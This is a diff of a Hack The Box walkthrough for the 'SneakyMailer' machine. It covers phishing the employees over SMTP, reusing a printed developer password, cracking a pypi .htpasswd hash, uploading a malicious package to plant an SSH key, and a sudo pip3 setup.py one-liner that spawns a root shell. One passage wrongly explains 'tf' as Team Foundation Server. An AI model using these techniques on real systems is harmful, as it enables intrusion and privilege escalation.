@@ -65,7 +65,7 @@ Nmap done: 1 IP address (1 host up) scanned in 115.24 seconds
 ```
 when i visited `http://10.10.10.179` it redirected me to `http://sneakycorp.htb` i added sneakymailer.htb to my `etc/hosts`
 then i discovered the platform.
-i found that this platform contains all Company employees mails in `team.php` page  so i distarct all this mails from `Html` page online [extract](http://www.emailx.discoveryvip.com/)
+i found that this platform contains all Company employees mails in `team.php` page  so i extract all this mails from `Html` page online [extract](http://www.emailx.discoveryvip.com/)
 and looking to the `nmap` result we found that port 25 is open so that `smtp`  so the idea that i have to send phising mail to all of this mails for this i craeate python script to send phising mail 
 ```
 import smtplib 
@@ -118,8 +118,8 @@ email: paulbyrd@sneakymailer.htb
 
 ```
 i tried to login to ftp server by this credential but i failed to login ,i stopped i don't know what to do
-so one of my friend give me hent
-hent is to know what is  up microsoft lookup.
+so one of my friend give me a hent.
+Hent was to know what microsoft lookup.
 
 So I searched to find a similar package for Linux in this link you will know all package [linux mailer ](https://itsfoss.com/best-email-clients-linux/).
 i installed  `evolution`.
@@ -157,21 +157,23 @@ after connecting to server i tried to get `usr.txt` but  can't
 ![Screenshot from 2020-10-07 17-39-14](https://user-images.githubusercontent.com/36403473/95354773-1e9b3600-08c5-11eb-91e8-26956bf2b9d8.png)
 so i took developer privilege his password ` m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`
 ![Screenshot from 2020-08-19 14-06-50](https://user-images.githubusercontent.com/36403473/95358441-5b692c00-08c9-11eb-9adc-d10aec84d9ed.png)
-in `/var/www/` directory i ffound another subdomain `pypi.sneakycorp.htb` so i added it to `etc/hosts` on my machine 
+in `/var/www/` directory i found another subdomain `pypi.sneakycorp.htb` so i added it to `etc/hosts` on my machine 
 in `pypi.sneakycorp.htb` directory i found `.hpasswd`.<br/>
 Firstly, i decrypted the hashed password it's MD5(APR)<br/> 
 password after decryption `soufianeelhaoui`<br/>
 
 I now have the privileges to upload my pypi server content
 So I have to look for a suitable Pypi Server. </br>
-`The idea is to have a pypi server so that we can upload or modify files, etc. So I looked for ways to upload to the pypi server and use it to take the powers of the user.`
+```
+The idea is to have a pypi server so that we can upload or modify files, etc. So I looked for ways to upload to the pypi server and use it to take the powers of the user.
+```
 After searching, I found out how to install pypi server
 [pypi setup](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/)
 
-`
+```
 The idea that I had in mind is to add the private ssh private to an empty autherized file, and from there, I can income via ssh and get low privileges.
 
-`
+```
 
 i created a package directory in tmp directory :
 ```
@@ -202,7 +204,9 @@ except :
 )
  
 ```
+by checking machine ports i found port `5000` was used by localhost so lets exploit it.
 then create .pypirc file:
+
 ```
 [distutils]
 index-servers =
@@ -218,3 +222,24 @@ repository: http://127.0.0.1:5000
 username: pypi 
 password: soufianeelhaoui
 ```
+
+```export HOME=/tmp/python```
+to run `setup.py` we should export python enviroment
+![Screenshot from 2020-08-22 02-42-44](https://user-images.githubusercontent.com/36403473/100475972-186b4e00-30ed-11eb-9651-3e16c965d062.png)
+now lets run the exploit and login via ssh 
+![Screenshot from 2020-08-24 07-04-17](https://user-images.githubusercontent.com/36403473/100479259-591b9500-30f6-11eb-9dfe-c1a43c9c9c53.png)
+![Screenshot from 2020-08-24 07-51-55](https://user-images.githubusercontent.com/36403473/100480331-9cc3ce00-30f9-11eb-8238-dfb6e847eeda.png)
+
+
+### 3-root access
+by checking user's privileges ,`low `can run command from `/usr/bin/pip3` 
+so we can get revese shell or anthor way that i use to get root access
+```
+tf Command line utility provide many useful operations that we can perform with Team Foundation Server. Here is a list and commands purpose.
+``` 
+by tf Command we can  add news folder and file from file system to TFS Source Control. Need to do check-in before these file can be visible.
+i created temporary file and run the exploit 
+```echo "import os; os.execl('/bin/sh', 'sh','-c', 'sh <$(tty) >$(tty) 2>$(tty)')" >$TF/setup.py```
+
+![Screenshot from 2020-08-24 07-38-46](https://user-images.githubusercontent.com/36403473/100485156-b835d580-3107-11eb-9599-04742cd2bf83.png)
+finally pwned 
